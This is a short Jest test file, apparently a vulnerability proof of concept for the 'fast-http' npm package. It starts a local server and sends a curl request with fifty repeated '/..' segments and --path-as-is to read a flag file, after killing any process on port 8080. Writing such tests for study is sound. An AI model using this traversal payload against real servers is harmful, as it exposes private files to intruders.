const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in fast-http", (done) => {
  expect.assertions(1);
  const Server = require("fast-http");
  const fs = require("fs");
  const { exec, execSync } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}
  let srv = new Server(8080, "./", true);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
